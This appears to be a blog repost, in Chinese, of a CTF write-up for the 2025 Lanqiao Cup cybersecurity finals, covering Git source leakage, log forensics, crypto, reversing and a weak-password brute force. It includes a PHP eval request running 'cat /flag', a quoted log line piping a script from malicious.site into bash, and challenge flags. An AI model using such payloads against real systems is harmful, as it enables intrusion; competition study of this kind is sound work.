@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞） | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="2025 蓝桥杯网络安全国赛：GitHack 源码泄露 + ssh attacker IP 溯源 + xxtea 解密 + fastcoll MD5 碰撞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞）">
+<meta property="og:url" content="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Web/2025%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%85%A8%E5%9B%BD%E6%80%BB%E5%86%B3%E8%B5%9BWriteUp/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="2025 蓝桥杯网络安全国赛：GitHack 源码泄露 + ssh attacker IP 溯源 + xxtea 解密 + fastcoll MD5 碰撞。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="蓝桥杯 2025 网络安全 国赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2025/01/01/ctf-kb/wp/Web/2025%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%85%A8%E5%9B%BD%E6%80%BB%E5%86%B3%E8%B5%9BWriteUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-31T16:00:00.000Z" title="发表于 2025-01-01 00:00:00">2025-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-31T16:00:00.000Z" title="更新于 2025-01-01 00:00:00">2025-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/267359.html">https://www.ctfiot.com/267359.html</a><br>ID: 267359</p>
+</blockquote>
+<p>2025蓝桥杯网络安全赛道全国总决赛题解</p>
+<p>一、情报收集</p>
+<p>1、被遗忘的</p>
+<p>题目内容：</p>
+<p>As the developer rushed to lunch, the IDE remained open on his desk. The cursor blinked beside a half-written comment:</p>
+<p>&#x2F;&#x2F; Fix: Remember to …</p>
+<p>题解：气死了，刚拿到源码比赛结束了。 这个题具体就是Git源码泄露，根据题目提示，在tools路径下有提示。访问得到工具“GitHack”可以将源码下载下来。代码审计xx.php文件</p>
+<p>POST &#x2F;xx.php HTTP&#x2F;1.1<br>Host: xxxxx.cloudeci1.ichunqiu.com<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.124 Safari&#x2F;537.36<br>Cookie: loginpass&#x3D;828193099115dcaa67805a0776785b3a<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 42</p>
+<p>action&#x3D;eval&amp;phpcode&#x3D;system(“cat &#x2F;flag”)</p>
+<p>构造请求包，即可登录后台拿到flag。</p>
+<p>flag：动态</p>
+<p>二、数据分析：</p>
+<p>1、server_logs</p>
+<p>文件名：（server_logs_ac1addb9e67faef5b2105de239e1990f.zip）</p>
+<p>题解：var&#x2F;log&#x2F;dnsmasq.log中第602行存在可疑的域名，猜测是攻击者使用的域名，其IP地址为：192.168.42.77。对其他文件进行搜索，寻找这个IP地址，不难发现存在了一个ssh登陆成功的日志信息：</p>
+<p>Jun 15 02:30:15 server sshd[5678]: Accepted password for attacker from 192.168.42.77 port 1337 Jun 15 02:30:30 server sudo: attacker : TTY&#x3D;pts&#x2F;0 ; COMMAND&#x3D;curl -s <a target="_blank" rel="noopener" href="http://malicious.site/backdoor.sh">http://malicious.site/backdoor.sh</a> | bash</p>
+<p>这ID名一看就知道是攻击者，所以前面的猜测是对的，攻击者在成功登录ssh后立刻执行了恶意命令，上传了一个后门脚本。在文件夹里锁定这个脚本，并且在另一个目录成功找到服务名为：hidden_backdoor。解题结束，综上得到flag。</p>
+<p>flag：flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}</p>
+<p>2、flowzip2</p>
+<p>文件名：（flowzip2_fe9d6d2cf5a6fe83f1d7f0fe3c60fa25.zip）</p>
+<p>题目内容：There are many encrypted zip files.</p>
+<p>题解：流量分析题目，查看流量包发现有好多压缩包，先导出看一看。点看看见压缩包下面有注释，好像是正则表达式d{3}即三位数字，批量爆破一下即可得到flag。</p>
+<p>flag：flag{5f5491b6-fddf-4be8-ab44-5a18831cc45b}</p>
+<p>三、密码破解：</p>
+<p>1、xxtea</p>
+<p>文件名：（xxtea_13e418f4e3f3d389f3cee45e90017de4.zip）</p>
+<p>题目内容：It’s getting hard to even copy the data this time. flag:<br>flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}</p>
+<p>题解：根据题目给的步骤反过来解密即可。</p>
+<p>flag：flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}</p>
+<p>2、fastcoll</p>
+<p>题目内容：这是一个MD5碰撞挑战：你能找到两个不同文件，但却拥有相同的MD5值吗？</p>
+<p>题解：文件名就是工具名，即：使用fastcoll工具生成两个文件。 提交即可获取flag。</p>
+<p>fastcoll_v1.0.0.5.exe -p gamelab_1.txt -o gamelab_2.txt gamelab_3.txt</p>
+<p>flag：动态</p>
+<p>3、qppq</p>
+<p>文件名：（server.py）</p>
+<p>题目内容：Slightly modify the pqqp problem.</p>
+<p>题解：基础的RSA题目，脚本：</p>
+<p>import gmpy2<br>from Crypto.Util.number import *</p>
+<p>n &#x3D; 67409525******<br>e &#x3D; 2218352136******<br>ciphertext &#x3D; [290125******]<br>param1 &#x3D; 5200952616******<br>param2 &#x3D; 0</p>
+<p>phi &#x3D; n + 1 - param1<br>d &#x3D; gmpy2.invert(e, phi)<br>m &#x3D; pow(ciphertext[0], d, n)<br>print(long_to_bytes(m))</p>
+<p>flag：flag{33a0958e-35c5-4ba4-8140-42b5005f137e}（动态）</p>
+<p>四、逆向分析</p>
+<p>1、encodefile</p>
+<p>文件名：（encodefile_ac68893d381e146c461008ad7a1fc396.zip）</p>
+<p>题目内容：分析一个用于加密明文的可执行程序，通过识别其加密逻辑成功解密生成的密文文件，恢复出原始数据内容。</p>
+<p>题解：RC4解密题，IDA查看字符串发现有lqb字样，跳转对应函数找到加密逻辑，RC4模板解密即可。</p>
+<p>flag：flag{db6007d2-9b1e-2f98-cef3-6595b63763dd}</p>
+<p>2、rand_pyc</p>
+<p>文件名：（rand_pyc_obf_b822fc9c41581fc991ee0e2f5fa9173c.zip）</p>
+<p>题目内容：对由Python打包生成的exe文件进行逆向处理，提取并还原出其核心源码，以便进一步分析程序逻辑并获得正确的输入。</p>
+<p>题解：题目名已给出提示是pyc反编译的题了，直接使用工具反编译即可。使用pyinstxtractor工具反编译为pyc，然后再使用uncompyle6工具将pyc反编译成python文件。</p>
+<p>import random<br>import base64</p>
+<p>a &#x3D; [4417023, 5690625, 9639225, 1327718, 4417023, 5085550, 5752075, 9556690, 5240080, 6431679, 3428007, 3189766, 3438336, 5757818, 3189766, 5690625, 4148389, 2254831, 6292433, 2122126, 5240080, 6431679, 9488271, 2464675, 7216908, 5757818, 3189766, 5690625, 3438336, 6431679, 2360475, 6002055, 5240080, 9040261, 8655414, 9347278, 3438336, 2254831, 2122126, 5135281, 2360475, 9347278, 4417023, 1327718, 3438336, 3448715, 9488271, 5501611, 5240080, 5757818, 9488271, 5501611, 5240080, 9347278, 4148389, 1714134, 9923116, 4267438, 4263793, 5752075, 2464675, 7777627, 6002055, 3485900]</p>
+<p>enc &#x3D; {}<br>for i in range(128):<br>    random.seed(i)<br>    enc[random.randint(1000000, 9999999)] &#x3D; chr(i)</p>
+<p>res &#x3D; ‘’.join([enc[num] for num in a])[:-8]<br>print(base64.b64decode(res).decode())</p>
+<h1 id="flag-30de99f4-50d2-9f8f-2868-dcfa9d81483c"><a href="#flag-30de99f4-50d2-9f8f-2868-dcfa9d81483c" class="headerlink" title="flag{30de99f4-50d2-9f8f-2868-dcfa9d81483c}"></a>flag{30de99f4-50d2-9f8f-2868-dcfa9d81483c}</h1><p>flag：flag{30de99f4-50d2-9f8f-2868-dcfa9d81483c}</p>
+<p>五、漏洞挖掘分析</p>
+<p>1、弱口令</p>
+<p>题解：打开链接，登录页面有一个测试账号密码，登陆进去之后发现提示：用户存在弱口令习惯，习惯为用户名+四位数字。使用字典生成器生成用户名为admin的密码：admin+四位数字，抓包后使用该字典爆破密码，最后得到密码为admin0621。登录成功即可拿到flag。</p>
+<p>开始抓包查看提示，竟然还有误导的提示，说是可能会有越权漏洞。我还以为是jwt伪造呢，浪费我好长时间。。。。。。</p>
+<p>flag：动态</p>
+<p>【更多题解】：</p>
+<p>2025御网杯【本科组】线下半决赛CTF+总决赛应急响应综合渗透WriteUp</p>
+<p>第九届御网杯网络安全大赛校级选拔赛题解</p>
+<p>2024 第八届强网杯青少年专项赛 writeup</p>
+<p>2024信阳师范大学CTF新生赛官方题解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /xx.php HTTP/1.1</span><br><span class="line">Host: xxxxx.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36</span><br><span class="line">Cookie: loginpass=828193099115dcaa67805a0776785b3a</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">action=eval&amp;phpcode=system(&quot;cat /flag&quot;)</span><br><span class="line">fastcoll_v1.0.0.5.exe -p gamelab_1.txt -o gamelab_2.txt gamelab_3.txt</span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n = 67409525******</span><br><span class="line">e = 2218352136******</span><br><span class="line">ciphertext = [290125******]</span><br><span class="line">param1 = 5200952616******</span><br><span class="line">param2 = 0</span><br><span class="line"></span><br><span class="line">phi = n + 1 - param1</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(ciphertext[0], d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line">import random</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a = [4417023, 5690625, 9639225, 1327718, 4417023, 5085550, 5752075, 9556690, 5240080, 6431679, 3428007, 3189766, 3438336, 5757818, 3189766, 5690625, 4148389, 2254831, 6292433, 2122126, 5240080, 6431679, 9488271, 2464675, 7216908, 5757818, 3189766, 5690625, 3438336, 6431679, 2360475, 6002055, 5240080, 9040261, 8655414, 9347278, 3438336, 2254831, 2122126, 5135281, 2360475, 9347278, 4417023, 1327718, 3438336, 3448715, 9488271, 5501611, 5240080, 5757818, 9488271, 5501611, 5240080, 9347278, 4148389, 1714134, 9923116, 4267438, 4263793, 5752075, 2464675, 7777627, 6002055, 3485900]</span><br><span class="line"></span><br><span class="line">enc = &#123;&#125;</span><br><span class="line">for i in range(128):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    enc[random.randint(1000000, 9999999)] = chr(i)</span><br><span class="line"></span><br><span class="line">res = &#x27;&#x27;.join([enc[num] for num in a])[:-8]</span><br><span class="line">print(base64.b64decode(res).decode())</span><br><span class="line"></span><br><span class="line"># flag&#123;30de99f4-50d2-9f8f-2868-dcfa9d81483c&#125;</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/267359.html">https://www.ctfiot.com/267359.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2025%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%85%A8%E5%9B%BD%E6%80%BB%E5%86%B3%E8%B5%9BWriteUp.full.md">CTF大赛WP集合&#x2F;articles&#x2F;2025蓝桥杯网络安全赛道全国总决赛WriteUp.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF-2025-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E5%9B%BD%E8%B5%9B/">蓝桥杯 2025 网络安全 国赛</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/01/01/ctf-kb/wp/Web/2025%E7%AC%AC%E4%B8%89%E5%B1%8A%E4%BA%AC%E9%BA%92CTF%E6%8C%91%E6%88%98%E8%B5%9B_writeup_by_Mini-Venom/" title="2025 第三届京麒 CTF 挑战赛 writeup by Mini-Venom"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2025 第三届京麒 CTF 挑战赛 writeup by Mini-Venom</div></div></a></div><div class="next-post pull-right"><a href="/2025/01/01/ctf-kb/wp/Web/2025%E5%B9%B4%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Writeup/" title="2025 年能源网络安全大赛 Writeup（ThinkPHP 3.2.2 写配置 + RSA 费马 + LWE BSGS）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2025 年能源网络安全大赛 Writeup（ThinkPHP 3.2.2 写配置 + RSA 费马 + LWE BSGS）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-30de99f4-50d2-9f8f-2868-dcfa9d81483c"><span class="toc-number">1.</span> <span class="toc-text">flag{30de99f4-50d2-9f8f-2868-dcfa9d81483c}</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog 